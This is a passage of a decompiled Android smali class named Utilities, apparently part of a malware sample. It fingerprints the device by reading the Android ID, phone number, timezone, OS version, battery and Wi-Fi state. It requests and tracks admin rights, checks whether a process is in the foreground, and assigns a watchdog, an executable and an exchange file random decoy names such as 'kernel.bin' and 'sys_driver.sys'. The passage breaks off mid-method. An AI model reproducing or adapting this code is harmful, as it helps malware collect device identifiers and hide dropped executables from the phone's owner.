.class public Lcom/fa/c/Utilities;
.super Ljava/lang/Object;
.source "Utilities.java"


# static fields
.field private static names:[Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 3

    .prologue
    .line 25
    const/16 v0, 0xf

    new-array v0, v0, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v2, "update.dat"

    aput-object v2, v0, v1

    const/4 v1, 0x1

    const-string v2, "settings.bin"

    aput-object v2, v0, v1

    const/4 v1, 0x2

    const-string v2, "update.bin"

    aput-object v2, v0, v1

    const/4 v1, 0x3

    const-string v2, "settings.dat"

    aput-object v2, v0, v1

    const/4 v1, 0x4

    const-string v2, "kernel.bin"

    aput-object v2, v0, v1

    const/4 v1, 0x5

    const-string v2, "core.bin"

    aput-object v2, v0, v1

    const/4 v1, 0x6

    const-string v2, "core.sys"

    aput-object v2, v0, v1

    const/4 v1, 0x7

    const-string v2, "hot_fix.dat"

    aput-object v2, v0, v1

    const/16 v1, 0x8

    const-string v2, "android.bin"

    aput-object v2, v0, v1

    const/16 v1, 0x9

    const-string v2, "sys.bin"

    aput-object v2, v0, v1

    const/16 v1, 0xa

    const-string v2, "inet.dat"

    aput-object v2, v0, v1

    const/16 v1, 0xb

    const-string v2, "wifi.bin"

    aput-object v2, v0, v1

    const/16 v1, 0xc

    const-string v2, "fix.bin"

    aput-object v2, v0, v1

    const/16 v1, 0xd

    const-string v2, "sys_driver.sys"

    aput-object v2, v0, v1

    const/16 v1, 0xe

    const-string v2, "lock.dat"

    aput-object v2, v0, v1

    sput-object v0, Lcom/fa/c/Utilities;->names:[Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 24
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static GetAdminRightsAsked(Landroid/content/Context;)Z
    .locals 2
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 53
    invoke-static {p0}, Lcom/fa/c/Utilities;->GetPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 54
    .local v0, "sp":Landroid/content/SharedPreferences;
    const-string v1, "ADMIN_RIGHTS_ASKED"

    invoke-interface {v0, v1}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v1

    return v1
.end method

.method public static GetDeviceId(Landroid/content/Context;)Ljava/lang/String;
    .locals 3
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 277
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    .line 278
    const-string v2, "android_id"

    .line 277
    invoke-static {v1, v2}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 279
    .local v0, "id":Ljava/lang/String;
    return-object v0
.end method

.method public static GetDeviceInfoBytes(Landroid/content/Context;)[B
    .locals 24
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 90
    :try_start_0
    invoke-static {}, Ljava/util/TimeZone;->getDefault()Ljava/util/TimeZone;

    move-result-object v18

    .line 91
    .local v18, "tz":Ljava/util/TimeZone;
    invoke-virtual/range {v18 .. v18}, Ljava/util/TimeZone;->getRawOffset()I

    move-result v16

    .line 92
    .local v16, "timeOffset":I
    move/from16 v0, v16

    div-int/lit16 v0, v0, 0x3e8

    move/from16 v20, v0

    div-int/lit8 v20, v20, 0x3c

    div-int/lit8 v16, v20, 0x3c

    .line 93
    move/from16 v0, v16

    int-to-byte v0, v0

    move/from16 v17, v0

    .line 98
    .local v17, "timeOffsetByte":B
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v20

    invoke-virtual/range {v20 .. v20}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v20

    .line 99
    const-string v21, "android_id"

    .line 98
    invoke-static/range {v20 .. v21}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 100
    .local v7, "id":Ljava/lang/String;
    invoke-virtual {v7}, Ljava/lang/String;->toCharArray()[C

    move-result-object v9

    .line 101
    .local v9, "idChars":[C
    invoke-static {v9}, Lcom/fa/c/Utilities;->ToBytes([C)[B

    move-result-object v8

    .line 106
    .local v8, "idBytes":[B
    sget v20, Landroid/os/Build$VERSION;->SDK_INT:I

    move/from16 v0, v20

    int-to-byte v0, v0

    move/from16 v19, v0

    .line 111
    .local v19, "version":B
    const/4 v11, 0x0

    .line 112
    .local v11, "isWifi":B
    const-string v20, "connectivity"

    move-object/from16 v0, p0

    move-object/from16 v1, v20

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/net/ConnectivityManager;

    .line 113
    .local v3, "connManager":Landroid/net/ConnectivityManager;
    const/16 v20, 0x1

    move/from16 v0, v20

    invoke-virtual {v3, v0}, Landroid/net/ConnectivityManager;->getNetworkInfo(I)Landroid/net/NetworkInfo;

    move-result-object v13

    .line 114
    .local v13, "mWifi":Landroid/net/NetworkInfo;
    invoke-virtual {v13}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v20

    if-eqz v20, :cond_0

    .line 116
    const/4 v11, 0x1

    .line 122
    :cond_0
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v20

    const/16 v21, 0x0

    new-instance v22, Landroid/content/IntentFilter;

    const-string v23, "android.intent.action.BATTERY_CHANGED"

    invoke-direct/range {v22 .. v23}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual/range {v20 .. v22}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    move-result-object v10

    .line 123
    .local v10, "intent":Landroid/content/Intent;
    const-string v20, "plugged"

    const/16 v21, -0x1

    move-object/from16 v0, v20

    move/from16 v1, v21

    invoke-virtual {v10, v0, v1}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v15

    .line 124
    .local v15, "status":I
    const/16 v20, 0x1

    move/from16 v0, v20

    if-ne v15, v0, :cond_3

    const/4 v14, 0x1

    .line 125
    .local v14, "plugged":Z
    :goto_0
    const/4 v2, 0x0

    .line 126
    .local v2, "batery":B
    if-eqz v14, :cond_1

    .line 128
    const/4 v2, 0x1

    .line 131
    :cond_1
    const/16 v20, 0x14

    move/from16 v0, v20

    new-array v4, v0, [B

    .line 133
    .local v4, "content":[B
    const/16 v12, 0x10

    .line 135
    .local v12, "length":I
    array-length v0, v8

    move/from16 v20, v0

    move/from16 v0, v20

    if-ge v0, v12, :cond_6

    .line 137
    array-length v12, v8

    .line 138
    const/4 v6, 0x0

    .local v6, "i":I
    :goto_1
    if-lt v6, v12, :cond_4

    .line 143
    move v6, v12

    :goto_2
    const/16 v20, 0x10

    move/from16 v0, v20

    if-lt v6, v0, :cond_5

    .line 157
    :cond_2
    const/16 v20, 0x10

    aput-byte v17, v4, v20

    .line 158
    const/16 v20, 0x11

    aput-byte v19, v4, v20

    .line 159
    const/16 v20, 0x12

    aput-byte v2, v4, v20

    .line 160
    const/16 v20, 0x13

    aput-byte v11, v4, v20

    .line 167
    .end local v2    # "batery":B
    .end local v3    # "connManager":Landroid/net/ConnectivityManager;
    .end local v4    # "content":[B
    .end local v6    # "i":I
    .end local v7    # "id":Ljava/lang/String;
    .end local v8    # "idBytes":[B
    .end local v9    # "idChars":[C
    .end local v10    # "intent":Landroid/content/Intent;
    .end local v11    # "isWifi":B
    .end local v12    # "length":I
    .end local v13    # "mWifi":Landroid/net/NetworkInfo;
    .end local v14    # "plugged":Z
    .end local v15    # "status":I
    .end local v16    # "timeOffset":I
    .end local v17    # "timeOffsetByte":B
    .end local v18    # "tz":Ljava/util/TimeZone;
    .end local v19    # "version":B
    :goto_3
    return-object v4

    .line 124
    .restart local v3    # "connManager":Landroid/net/ConnectivityManager;
    .restart local v7    # "id":Ljava/lang/String;
    .restart local v8    # "idBytes":[B
    .restart local v9    # "idChars":[C
    .restart local v10    # "intent":Landroid/content/Intent;
    .restart local v11    # "isWifi":B
    .restart local v13    # "mWifi":Landroid/net/NetworkInfo;
    .restart local v15    # "status":I
    .restart local v16    # "timeOffset":I
    .restart local v17    # "timeOffsetByte":B
    .restart local v18    # "tz":Ljava/util/TimeZone;
    .restart local v19    # "version":B
    :cond_3
    const/4 v14, 0x0

    goto :goto_0

    .line 140
    .restart local v2    # "batery":B
    .restart local v4    # "content":[B
    .restart local v6    # "i":I
    .restart local v12    # "length":I
    .restart local v14    # "plugged":Z
    :cond_4
    aget-byte v20, v8, v6

    aput-byte v20, v4, v6

    .line 138
    add-int/lit8 v6, v6, 0x1

    goto :goto_1

    .line 145
    :cond_5
    const/16 v20, 0x30

    aput-byte v20, v4, v6

    .line 143
    add-int/lit8 v6, v6, 0x1

    goto :goto_2

    .line 150
    .end local v6    # "i":I
    :cond_6
    const/4 v6, 0x0

    .restart local v6    # "i":I
    :goto_4
    if-ge v6, v12, :cond_2

    .line 152
    aget-byte v20, v8, v6

    aput-byte v20, v4, v6
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 150
    add-int/lit8 v6, v6, 0x1

    goto :goto_4

    .line 163
    .end local v2    # "batery":B
    .end local v3    # "connManager":Landroid/net/ConnectivityManager;
    .end local v4    # "content":[B
    .end local v6    # "i":I
    .end local v7    # "id":Ljava/lang/String;
    .end local v8    # "idBytes":[B
    .end local v9    # "idChars":[C
    .end local v10    # "intent":Landroid/content/Intent;
    .end local v11    # "isWifi":B
    .end local v12    # "length":I
    .end local v13    # "mWifi":Landroid/net/NetworkInfo;
    .end local v14    # "plugged":Z
    .end local v15    # "status":I
    .end local v16    # "timeOffset":I
    .end local v17    # "timeOffsetByte":B
    .end local v18    # "tz":Ljava/util/TimeZone;
    .end local v19    # "version":B
    :catch_0
    move-exception v5

    .line 165
    .local v5, "e":Ljava/lang/Exception;
    const-string v20, "CPS"

    new-instance v21, Ljava/lang/StringBuilder;

    const-string v22, "GetDeviceInfoBytes "

    invoke-direct/range {v21 .. v22}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v22

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v21

    invoke-static/range {v20 .. v21}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 167
    const/4 v4, 0x0

    goto :goto_3
.end method

.method public static GetDeviceInfoCommandLineArgs(Landroid/content/Context;)Ljava/lang/String;
    .locals 22
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 174
    :try_start_0
    invoke-static {}, Ljava/util/TimeZone;->getDefault()Ljava/util/TimeZone;

    move-result-object v16

    .line 175
    .local v16, "tz":Ljava/util/TimeZone;
    invoke-virtual/range {v16 .. v16}, Ljava/util/TimeZone;->getRawOffset()I

    move-result v14

    .line 176
    .local v14, "timeOffset":I
    div-int/lit16 v0, v14, 0x3e8

    move/from16 v18, v0

    div-int/lit8 v18, v18, 0x3c

    div-int/lit8 v14, v18, 0x3c

    .line 177
    int-to-byte v15, v14

    .line 182
    .local v15, "timeOffsetByte":B
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v18

    invoke-virtual/range {v18 .. v18}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v18

    .line 183
    const-string v19, "android_id"

    .line 182
    invoke-static/range {v18 .. v19}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 184
    .local v6, "id":Ljava/lang/String;
    invoke-virtual {v6}, Ljava/lang/String;->toCharArray()[C

    move-result-object v8

    .line 185
    .local v8, "idChars":[C
    invoke-static {v8}, Lcom/fa/c/Utilities;->ToBytes([C)[B

    move-result-object v7

    .line 190
    .local v7, "idBytes":[B
    sget v18, Landroid/os/Build$VERSION;->SDK_INT:I

    move/from16 v0, v18

    int-to-byte v0, v0

    move/from16 v17, v0

    .line 195
    .local v17, "version":B
    const/4 v10, 0x0

    .line 196
    .local v10, "isWifi":B
    const-string v18, "connectivity"

    move-object/from16 v0, p0

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/net/ConnectivityManager;

    .line 197
    .local v3, "connManager":Landroid/net/ConnectivityManager;
    const/16 v18, 0x1

    move/from16 v0, v18

    invoke-virtual {v3, v0}, Landroid/net/ConnectivityManager;->getNetworkInfo(I)Landroid/net/NetworkInfo;

    move-result-object v11

    .line 198
    .local v11, "mWifi":Landroid/net/NetworkInfo;
    invoke-virtual {v11}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v18

    if-eqz v18, :cond_0

    .line 200
    const/4 v10, 0x1

    .line 206
    :cond_0
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v18

    const/16 v19, 0x0

    new-instance v20, Landroid/content/IntentFilter;

    const-string v21, "android.intent.action.BATTERY_CHANGED"

    invoke-direct/range {v20 .. v21}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual/range {v18 .. v20}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    move-result-object v9

    .line 207
    .local v9, "intent":Landroid/content/Intent;
    const-string v18, "plugged"

    const/16 v19, -0x1

    move-object/from16 v0, v18

    move/from16 v1, v19

    invoke-virtual {v9, v0, v1}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v13

    .line 208
    .local v13, "status":I
    const/16 v18, 0x1

    move/from16 v0, v18

    if-ne v13, v0, :cond_2

    const/4 v12, 0x1

    .line 209
    .local v12, "plugged":Z
    :goto_0
    const/4 v2, 0x0

    .line 210
    .local v2, "batery":B
    if-eqz v12, :cond_1

    .line 212
    const/4 v2, 0x1

    .line 215
    :cond_1
    new-instance v5, Ljava/lang/String;

    const-string v18, "UTF-8"

    move-object/from16 v0, v18

    invoke-direct {v5, v7, v0}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    .line 216
    .local v5, "finalId":Ljava/lang/String;
    new-instance v18, Ljava/lang/StringBuilder;

    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v19

    invoke-direct/range {v18 .. v19}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v19, " "

    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    move-object/from16 v0, v18

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v18

    const-string v19, " "

    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    move-object/from16 v0, v18

    move/from16 v1, v17

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v18

    const-string v19, " "

    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v18

    const-string v19, " "

    invoke-virtual/range {v18 .. v19}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v18

    move-object/from16 v0, v18

    invoke-virtual {v0, v10}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v18

    invoke-virtual/range {v18 .. v18}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v18

    .line 222
    .end local v2    # "batery":B
    .end local v3    # "connManager":Landroid/net/ConnectivityManager;
    .end local v5    # "finalId":Ljava/lang/String;
    .end local v6    # "id":Ljava/lang/String;
    .end local v7    # "idBytes":[B
    .end local v8    # "idChars":[C
    .end local v9    # "intent":Landroid/content/Intent;
    .end local v10    # "isWifi":B
    .end local v11    # "mWifi":Landroid/net/NetworkInfo;
    .end local v12    # "plugged":Z
    .end local v13    # "status":I
    .end local v14    # "timeOffset":I
    .end local v15    # "timeOffsetByte":B
    .end local v16    # "tz":Ljava/util/TimeZone;
    .end local v17    # "version":B
    :goto_1
    return-object v18

    .line 208
    .restart local v3    # "connManager":Landroid/net/ConnectivityManager;
    .restart local v6    # "id":Ljava/lang/String;
    .restart local v7    # "idBytes":[B
    .restart local v8    # "idChars":[C
    .restart local v9    # "intent":Landroid/content/Intent;
    .restart local v10    # "isWifi":B
    .restart local v11    # "mWifi":Landroid/net/NetworkInfo;
    .restart local v13    # "status":I
    .restart local v14    # "timeOffset":I
    .restart local v15    # "timeOffsetByte":B
    .restart local v16    # "tz":Ljava/util/TimeZone;
    .restart local v17    # "version":B
    :cond_2
    const/4 v12, 0x0

    goto :goto_0

    .line 218
    .end local v3    # "connManager":Landroid/net/ConnectivityManager;
    .end local v6    # "id":Ljava/lang/String;
    .end local v7    # "idBytes":[B
    .end local v8    # "idChars":[C
    .end local v9    # "intent":Landroid/content/Intent;
    .end local v10    # "isWifi":B
    .end local v11    # "mWifi":Landroid/net/NetworkInfo;
    .end local v13    # "status":I
    .end local v14    # "timeOffset":I
    .end local v15    # "timeOffsetByte":B
    .end local v16    # "tz":Ljava/util/TimeZone;
    .end local v17    # "version":B
    :catch_0
    move-exception v4

    .line 220
    .local v4, "e":Ljava/lang/Exception;
    const-string v18, "CPS"

    invoke-virtual {v4}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v19

    invoke-static/range {v18 .. v19}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 222
    const/16 v18, 0x0

    goto :goto_1
.end method

.method public static GetDeviceInfoString(Landroid/content/Context;)Ljava/lang/String;
    .locals 5
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 69
    :try_start_0
    invoke-static {p0}, Lcom/fa/c/Utilities;->GetDeviceInfoBytes(Landroid/content/Context;)[B

    move-result-object v1

    .line 73
    .local v1, "info":[B
    if-eqz v1, :cond_0

    .line 75
    new-instance v2, Ljava/lang/String;

    const-string v3, "UTF-8"

    invoke-direct {v2, v1, v3}, Ljava/lang/String;-><init>([BLjava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 83
    .end local v1    # "info":[B
    :goto_0
    return-object v2

    .line 79
    :catch_0
    move-exception v0

    .line 81
    .local v0, "e":Ljava/lang/Exception;
    const-string v2, "CPS"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, " GetDeviceInfoString "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 83
    .end local v0    # "e":Ljava/lang/Exception;
    :cond_0
    const/4 v2, 0x0

    goto :goto_0
.end method

.method public static GetExchangeFileName(Landroid/content/Context;)Ljava/lang/String;
    .locals 3
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 237
    invoke-static {p0}, Lcom/fa/c/Utilities;->GetPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v1, "KEY_EXCHANGE_FILE"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public static GetExecName(Landroid/content/Context;)Ljava/lang/String;
    .locals 3
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 232
    invoke-static {p0}, Lcom/fa/c/Utilities;->GetPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v1, "KEY_EXEC"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public static GetInstallType(Landroid/content/Context;)I
    .locals 3
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 39
    invoke-static {p0}, Lcom/fa/c/Utilities;->GetPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 40
    .local v0, "sp":Landroid/content/SharedPreferences;
    const-string v1, "KEY_INSTALL_TYPE"

    const-string v2, "-1"

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    return v1
.end method

.method public static GetPhoneNumber(Landroid/content/Context;)Ljava/lang/String;
    .locals 4
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 286
    :try_start_0
    const-string v3, "phone"

    invoke-virtual {p0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/telephony/TelephonyManager;

    .line 287
    .local v2, "tMgr":Landroid/telephony/TelephonyManager;
    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v1

    .line 288
    .local v1, "mPhoneNumber":Ljava/lang/String;
    if-nez v1, :cond_0

    .line 289
    const-string v1, "NO_SIM"
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 295
    .end local v1    # "mPhoneNumber":Ljava/lang/String;
    .end local v2    # "tMgr":Landroid/telephony/TelephonyManager;
    :cond_0
    :goto_0
    return-object v1

    .line 293
    :catch_0
    move-exception v0

    .line 295
    .local v0, "e":Ljava/lang/Exception;
    const-string v1, "NO_SIM"

    goto :goto_0
.end method

.method public static GetPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;
    .locals 1
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 29
    invoke-static {p0}, Landroid/preference/PreferenceManager;->getDefaultSharedPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v0

    return-object v0
.end method

.method public static GetPreferncesEditor(Landroid/content/Context;)Landroid/content/SharedPreferences$Editor;
    .locals 1
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 34
    invoke-static {p0}, Lcom/fa/c/Utilities;->GetPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    return-object v0
.end method

.method public static GetWatchDogName(Landroid/content/Context;)Ljava/lang/String;
    .locals 3
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 227
    invoke-static {p0}, Lcom/fa/c/Utilities;->GetPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v1, "KEY_WATCH_DOG"

    const/4 v2, 0x0

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public static IsProcessRunningAndTop(Ljava/lang/String;)Z
    .locals 5
    .param p0, "name"    # Ljava/lang/String;

    .prologue
    const/4 v2, 0x0

    .line 306
    invoke-static {}, Lcom/jaredrummler/android/processes/ProcessManager;->getRunningAppProcesses()Ljava/util/List;

    move-result-object v1

    .line 307
    .local v1, "processes":Ljava/util/List;, "Ljava/util/List<Lcom/jaredrummler/android/processes/models/AndroidAppProcess;>;"
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_0
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-nez v4, :cond_2

    .line 317
    :cond_1
    :goto_0
    return v2

    .line 307
    :cond_2
    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/jaredrummler/android/processes/models/AndroidAppProcess;

    .line 309
    .local v0, "p":Lcom/jaredrummler/android/processes/models/AndroidAppProcess;
    invoke-virtual {v0}, Lcom/jaredrummler/android/processes/models/AndroidAppProcess;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4, p0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_0

    .line 311
    iget-boolean v3, v0, Lcom/jaredrummler/android/processes/models/AndroidAppProcess;->foreground:Z

    if-eqz v3, :cond_1

    .line 312
    const/4 v2, 0x1

    goto :goto_0
.end method

.method public static IsRandomNames(Landroid/content/Context;)Z
    .locals 2
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 301
    invoke-static {p0}, Lcom/fa/c/Utilities;->GetPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v1, "KEY_WATCH_DOG"

    invoke-interface {v0, v1}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v0

    return v0
.end method

.method public static SetAdminRightsAsked(Landroid/content/Context;)V
    .locals 4
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 59
    invoke-static {p0}, Lcom/fa/c/Utilities;->GetPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 60
    .local v1, "sp":Landroid/content/SharedPreferences;
    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 61
    .local v0, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v2, "ADMIN_RIGHTS_ASKED"

    const/4 v3, 0x1

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 62
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 63
    return-void
.end method

.method public static SetInstallType(ILandroid/content/Context;)V
    .locals 3
    .param p0, "type"    # I
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 46
    invoke-static {p1}, Lcom/fa/c/Utilities;->GetPreferncesEditor(Landroid/content/Context;)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 47
    .local v0, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v1, "KEY_INSTALL_TYPE"

    invoke-static {p0}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 48
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 49
    return-void
.end method

.method public static SetRandomNames(Landroid/content/Context;)V
    .locals 9
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 246
    invoke-static {p0}, Lcom/fa/c/Utilities;->GetPreferncesEditor(Landroid/content/Context;)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 247
    .local v0, "editor":Landroid/content/SharedPreferences$Editor;
    new-instance v5, Ljava/util/Random;

    invoke-direct {v5}, Ljava/util/Random;-><init>()V

    .line 248
    .local v5, "randomizer":Ljava/util/Random;
    sget-object v8, Lcom/fa/c/Utilities;->names:[Ljava/lang/String;

    array-length v8, v8

    invoke-virtual {v5, v8}, Ljava/util/Random;->nextInt(I)I

    move-result v4

    .line 250
    .local v4, "index":I
    move v6, v4

    .line 252
    .local v6, "wdIndex":I
    sget-object v8, Lcom/fa/c/Utilities;->names:[Ljava/lang/String;

    aget-object v7, v8, v6

    .line 254
    .local v7, "wdName":Ljava/lang/String;
    :goto_0
    if-eq v6, v4, :cond_0

    .line 259
    sget-object v8, Lcom/fa/c/Utilities;->names:[Ljava/lang/String;

    aget-object v3, v8, v4

    .line 260
    .local v3, "execName":Ljava/lang/String;
    move v2, v4

    .line 262
    .local v2, "execIndex":I
    :goto_1
    if-eq v2, v4, :cond_1

    if-eq v6, v4, :cond_1

    .line 267
    sget-object v8, Lcom/fa/c/Utilities;->names:[Ljava/lang/String;

    aget-object v1, v8, v4

    .line 269
    .local v1, "exchangeName":Ljava/lang/String;
    const-string v8, "KEY_WATCH_DOG"

